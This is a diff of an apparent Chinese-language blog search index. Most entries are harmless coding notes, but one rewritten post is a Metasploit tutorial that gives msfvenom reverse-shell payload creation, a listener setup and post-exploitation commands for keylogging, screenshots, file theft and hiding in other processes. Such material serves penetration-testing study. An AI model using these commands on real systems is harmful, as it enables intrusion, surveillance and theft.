@@ -387,26 +387,6 @@
       </tags>
   </entry>
   <entry>
-    <title>如何使用 Regex 群組</title>
-    <url>/2022/05/22/JsRegexGroup/</url>
-    <content><![CDATA[<h1 id="使用-Regex-群組"><a class="header-anchor" href="#使用-Regex-群組"></a>使用 Regex 群組</h1>
-<p>群組方法用法如下</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立規則</span></span><br><span class="line"><span class="keyword">var</span> myRegexp = <span class="regexp">/(?&lt;群組名稱&gt;.*)Test/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 執行規則</span></span><br><span class="line"><span class="keyword">var</span> match =  myRegexp.<span class="title function_">exec</span>(<span class="string">&#x27;123Test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取得執行結果 output: 123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(match.<span class="property">groups</span>.群組名稱);</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Groups_and_Ranges">MDN</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Javascript</category>
-      </categories>
-      <tags>
-        <tag>Javascript</tag>
-        <tag>Regex</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux IBM i Access Odbc 手動安裝</title>
     <url>/2021/10/05/LinuxIbmIAccessOdbc/</url>
     <content><![CDATA[<h1 id="配置-Odbc-元件"><a class="header-anchor" href="#配置-Odbc-元件"></a>配置 Odbc 元件</h1>
@@ -433,6 +413,26 @@
         <tag>Ubuntu</tag>
         <tag>Odbc</tag>
         <tag>IBM i Access</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何使用 Regex 群組</title>
+    <url>/2022/05/22/JsRegexGroup/</url>
+    <content><![CDATA[<h1 id="使用-Regex-群組"><a class="header-anchor" href="#使用-Regex-群組"></a>使用 Regex 群組</h1>
+<p>群組方法用法如下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立規則</span></span><br><span class="line"><span class="keyword">var</span> myRegexp = <span class="regexp">/(?&lt;群組名稱&gt;.*)Test/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 執行規則</span></span><br><span class="line"><span class="keyword">var</span> match =  myRegexp.<span class="title function_">exec</span>(<span class="string">&#x27;123Test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取得執行結果 output: 123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(match.<span class="property">groups</span>.群組名稱);</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Groups_and_Ranges">MDN</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Javascript</category>
+      </categories>
+      <tags>
+        <tag>Javascript</tag>
+        <tag>Regex</tag>
       </tags>
   </entry>
   <entry>
@@ -494,30 +494,6 @@ plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[�
       </tags>
   </entry>
   <entry>
-    <title>使用 AddInMemoryCollection 設定 Configuration 進行單元測試</title>
-    <url>/2023/01/21/NetAddInMemoryCollection/</url>
-    <content><![CDATA[<h1 id="設定-appsettings-json-如下"><a class="header-anchor" href="#設定-appsettings-json-如下"></a>設定 appsettings.json 如下</h1>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;LogLevel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Microsoft.AspNetCore&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Warning&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="轉換為-Dictionary-string-string"><a class="header-anchor" href="#轉換為-Dictionary-string-string"></a>轉換為 Dictionary&lt;string, string&gt;</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; inMemorySettings = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Logging:LogLevel:Default&quot;</span>,  <span class="string">&quot;Information&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Logging:LogLevel:Microsoft.AspNetCore&quot;</span>,  <span class="string">&quot;Warning&quot;</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h1 id="建立-Configuration"><a class="header-anchor" href="#建立-Configuration"></a>建立 Configuration</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">IConfiguration configuration = <span class="keyword">new</span> ConfigurationBuilder()</span><br><span class="line">            .AddInMemoryCollection(inMemorySettings)</span><br><span class="line">            .Build();</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://learn.microsoft.com/en-us/dotnet/api/microsoft.extensions.configuration.memoryconfigurationbuilderextensions.addinmemorycollection?view=dotnet-plat-ext-7.0">MemoryConfigurationBuilderExtensions.AddInMemoryCollection Method</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>.Net</category>
-      </categories>
-      <tags>
-        <tag>.Net</tag>
-        <tag>UnitTest</tag>
-        <tag>IConfiguration</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>依字元內碼轉換 Big5 與 Unicode</title>
     <url>/2022/05/22/NetBig5AndUnicode/</url>
     <content><![CDATA[<h1 id="轉換-Big5-字元"><a class="header-anchor" href="#轉換-Big5-字元"></a>轉換 Big5 字元</h1>
@@ -541,6 +517,30 @@ plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[�
         <tag>Font</tag>
         <tag>Big5</tag>
         <tag>Unicode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 AddInMemoryCollection 設定 Configuration 進行單元測試</title>
+    <url>/2023/01/21/NetAddInMemoryCollection/</url>
+    <content><![CDATA[<h1 id="設定-appsettings-json-如下"><a class="header-anchor" href="#設定-appsettings-json-如下"></a>設定 appsettings.json 如下</h1>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;LogLevel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Microsoft.AspNetCore&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Warning&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="轉換為-Dictionary-string-string"><a class="header-anchor" href="#轉換為-Dictionary-string-string"></a>轉換為 Dictionary&lt;string, string&gt;</h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; inMemorySettings = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Logging:LogLevel:Default&quot;</span>,  <span class="string">&quot;Information&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Logging:LogLevel:Microsoft.AspNetCore&quot;</span>,  <span class="string">&quot;Warning&quot;</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h1 id="建立-Configuration"><a class="header-anchor" href="#建立-Configuration"></a>建立 Configuration</h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">IConfiguration configuration = <span class="keyword">new</span> ConfigurationBuilder()</span><br><span class="line">            .AddInMemoryCollection(inMemorySettings)</span><br><span class="line">            .Build();</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://learn.microsoft.com/en-us/dotnet/api/microsoft.extensions.configuration.memoryconfigurationbuilderextensions.addinmemorycollection?view=dotnet-plat-ext-7.0">MemoryConfigurationBuilderExtensions.AddInMemoryCollection Method</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>.Net</category>
+      </categories>
+      <tags>
+        <tag>.Net</tag>
+        <tag>UnitTest</tag>
+        <tag>IConfiguration</tag>
       </tags>
   </entry>
   <entry>
@@ -875,6 +875,30 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
+    <title>使用 Python Script 進行 FontForge 字型檔轉換</title>
+    <url>/2021/10/23/PythonFontForgeTransfer/</url>
+    <content><![CDATA[<h1 id="建立-font-py-檔案"><a class="header-anchor" href="#建立-font-py-檔案"></a>建立 <a href="http://font.py">font.py</a> 檔案</h1>
+<p>使用 python 操作 fontforge 轉換字型檔</p>
+<span id="more"></span>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 載入 FontForge 模組</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定義 main 函數</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():	</span><br><span class="line">	<span class="comment"># 載入參數</span></span><br><span class="line">	fontFilePath = sys.argv[<span class="number">1</span>]	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 開啟字型檔</span></span><br><span class="line">	originFile=fontforge.<span class="built_in">open</span>(fontFilePath)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	originFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 複製字型至剪貼簿</span></span><br><span class="line">	originFile.copy()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 建立新的字型檔</span></span><br><span class="line">	newFile=fontforge.font()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 sfnt_names 參數與原檔一致</span></span><br><span class="line">	newFile.sfnt_names = originFile.sfnt_names	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 encoding 參數與原檔一致</span></span><br><span class="line">	newFile.encoding = originFile.encoding	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 size 參數與原檔一致</span></span><br><span class="line">	newFile.em = originFile.em	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 layers 參數與原檔一致</span></span><br><span class="line">	newFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic = originFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	newFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 貼上剪貼簿內容</span></span><br><span class="line">	newFile.paste()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定字型名稱</span></span><br><span class="line">	newFile.fontname=<span class="string">&quot;EUDC&quot;</span>	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 保存為woff字型</span></span><br><span class="line">	newFile.generate(<span class="string">&quot;EUDC.woff&quot;</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 關閉字型檔</span></span><br><span class="line">	originFile.close()	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行 main 函數</span></span><br><span class="line">main()	</span><br></pre></td></tr></table></figure>
+<h1 id="執行-Python-Script"><a class="header-anchor" href="#執行-Python-Script"></a>執行 Python Script</h1>
+<p>使用 FontForge 執行 Python Script</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fontforge -script font.py [FontFilePath]</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://fontforge.org/docs/scripting/python.html">Python Scripting</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Font</tag>
+        <tag>Python</tag>
+        <tag>FontForge</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用 Flask-SQLAlchemy 連接 MSSQL 進行 CRUD</title>
     <url>/2023/07/07/PythonFlaskSQLAlchemy/</url>
     <content><![CDATA[<h1 id="安裝套件"><a class="header-anchor" href="#安裝套件"></a>安裝套件</h1>
@@ -904,70 +928,57 @@ db.create_all() -->
       </tags>
   </entry>
   <entry>
-    <title>使用 Python Script 進行 FontForge 字型檔轉換</title>
-    <url>/2021/10/23/PythonFontForgeTransfer/</url>
-    <content><![CDATA[<h1 id="建立-font-py-檔案"><a class="header-anchor" href="#建立-font-py-檔案"></a>建立 <a href="http://font.py">font.py</a> 檔案</h1>
-<p>使用 python 操作 fontforge 轉換字型檔</p>
-<span id="more"></span>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 載入 FontForge 模組</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定義 main 函數</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():	</span><br><span class="line">	<span class="comment"># 載入參數</span></span><br><span class="line">	fontFilePath = sys.argv[<span class="number">1</span>]	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 開啟字型檔</span></span><br><span class="line">	originFile=fontforge.<span class="built_in">open</span>(fontFilePath)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	originFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 複製字型至剪貼簿</span></span><br><span class="line">	originFile.copy()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 建立新的字型檔</span></span><br><span class="line">	newFile=fontforge.font()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 sfnt_names 參數與原檔一致</span></span><br><span class="line">	newFile.sfnt_names = originFile.sfnt_names	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 encoding 參數與原檔一致</span></span><br><span class="line">	newFile.encoding = originFile.encoding	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 size 參數與原檔一致</span></span><br><span class="line">	newFile.em = originFile.em	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 layers 參數與原檔一致</span></span><br><span class="line">	newFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic = originFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	newFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 貼上剪貼簿內容</span></span><br><span class="line">	newFile.paste()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定字型名稱</span></span><br><span class="line">	newFile.fontname=<span class="string">&quot;EUDC&quot;</span>	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 保存為woff字型</span></span><br><span class="line">	newFile.generate(<span class="string">&quot;EUDC.woff&quot;</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 關閉字型檔</span></span><br><span class="line">	originFile.close()	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行 main 函數</span></span><br><span class="line">main()	</span><br></pre></td></tr></table></figure>
-<h1 id="執行-Python-Script"><a class="header-anchor" href="#執行-Python-Script"></a>執行 Python Script</h1>
-<p>使用 FontForge 執行 Python Script</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fontforge -script font.py [FontFilePath]</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://fontforge.org/docs/scripting/python.html">Python Scripting</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Font</tag>
-        <tag>Python</tag>
-        <tag>FontForge</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Metasploit 基本使用</title>
     <url>/2024/06/01/SecurityMetasploit/</url>
     <content><![CDATA[<!-- 設定檔位置: ~/.msf4 -->
 <h1 id="開啟-Metasploit-Console"><a class="header-anchor" href="#開啟-Metasploit-Console"></a>開啟 Metasploit Console</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
-<h1 id="初始化資料庫"><a class="header-anchor" href="#初始化資料庫"></a>初始化資料庫</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line">sudo msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
-<h1 id="更新可用模組"><a class="header-anchor" href="#更新可用模組"></a>更新可用模組</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
+<h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
 <h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基礎掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># vulners.com 線上漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br></pre></td></tr></table></figure>
-<h1 id="顯示可用模組"><a class="header-anchor" href="#顯示可用模組"></a>顯示可用模組</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br></pre></td></tr></table></figure>
-<h1 id="查找模組"><a class="header-anchor" href="#查找模組"></a>查找模組</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
-<h1 id="模組使用"><a class="header-anchor" href="#模組使用"></a>模組使用</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h1 id="payload-用途"><a class="header-anchor" href="#payload-用途"></a>payload 用途</h1>
-<pre><code>用途: 產生 command shell payload
-模組: windows/shell/reverse_tcp
-說明: 獲得一個命令行界面，允許攻擊者在目標系統上執行命令
-
-用途: 產生 meterpreter payload
-模組: windows/meterpreter/reverse_tcp
-說明: 一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等
-
-用途: 產生 vnc payload
-模組: windows/vncinject/reverse_tcp
-說明: 在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面
-</code></pre>
-<h1 id="基本操作"><a class="header-anchor" href="#基本操作"></a>基本操作</h1>
-<h2 id="創建-meterpreter-payload"><a class="header-anchor" href="#創建-meterpreter-payload"></a>創建 meterpreter payload :</h2>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[IP位置] LPORT=[監聽端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
-<h2 id="監聽-payload-，等待遠端執行-payload"><a class="header-anchor" href="#監聽-payload-，等待遠端執行-payload"></a>監聽 payload ，等待遠端執行 payload</h2>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h2 id="遠端執行-payload"><a class="header-anchor" href="#遠端執行-payload"></a>遠端執行 payload</h2>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基礎掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># vulners.com 線上漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br></pre></td></tr></table></figure>
+<h1 id="模組操作"><a class="header-anchor" href="#模組操作"></a>模組操作</h1>
+<p>⭐ 更新可用模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
+<p>⭐ 顯示可用模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br></pre></td></tr></table></figure>
+<p>⭐ 查找模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
+<p>⭐ 模組使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h1 id="payload-基本操作"><a class="header-anchor" href="#payload-基本操作"></a>payload 基本操作</h1>
+<p>⭐ 用途介紹</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">用途</th>
+<th style="text-align:left">說明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">command shell</td>
+<td style="text-align:left">獲得一個命令行界面，允許攻擊者在目標系統上執行命令</td>
+</tr>
+<tr>
+<td style="text-align:left">meterpreter</td>
+<td style="text-align:left">一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等</td>
+</tr>
+<tr>
+<td style="text-align:left">vnc</td>
+<td style="text-align:left">在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面</td>
+</tr>
+</tbody>
+</table>
+<p>⭐ 創建 meterpreter payload :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
+<p>⭐ 監聽 payload ，等待遠端執行 payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>⭐ 遠端執行 payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
 <h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
